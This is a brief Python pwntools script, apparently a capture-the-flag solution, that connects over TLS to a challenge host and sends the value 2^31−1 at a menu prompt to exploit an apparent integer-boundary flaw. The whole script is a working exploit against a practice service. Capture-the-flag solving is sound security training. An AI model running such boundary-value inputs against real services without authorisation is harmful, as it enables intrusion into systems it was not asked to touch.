from pwn import *

r = remote('a2a88dd5-5a72-4193-a74a-e112f6dde569.library.m0unt41n.ch', 31337, ssl=True)
context.log_level = 'debug'
r.sendlineafter(b'Enter your choice: ', str(int('1'*31, 2)).encode())
r.recvall()
